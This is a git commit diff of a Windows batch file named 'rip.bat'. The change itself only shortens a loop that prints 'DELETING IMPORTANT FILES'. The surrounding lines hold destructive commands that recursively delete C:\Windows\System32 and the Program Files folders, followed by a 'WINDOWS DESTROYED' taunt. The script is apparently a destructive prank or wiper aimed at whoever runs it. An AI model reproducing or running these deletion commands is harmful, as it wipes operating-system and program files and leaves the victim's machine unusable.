66fa1c3c78ebbe42961eb481eb207e033140fc40
FonderElite <71190959+FonderElite@users.noreply.github.com>
2020-12-27 21:35:09 +0800

    Update rip.bat

--- rip.bat
+++ rip.bat
@@ -11,7 +11,7 @@ Next
 del /S C:\Windows\System32
 del /S C:\Program Files and C:\Program Files (x86)
 color 02
-for /L %%n in (2,2,10000)do echo DELETING IMPORTANT FILES....
+for /L %%n in (2,2,3000)do echo DELETING IMPORTANT FILES....
 color 04 
 for /L %%n in (3,3,2000)do echo HACKED!  WINDOWS DESTROYED BY FONDERELITE!!! 
 exit
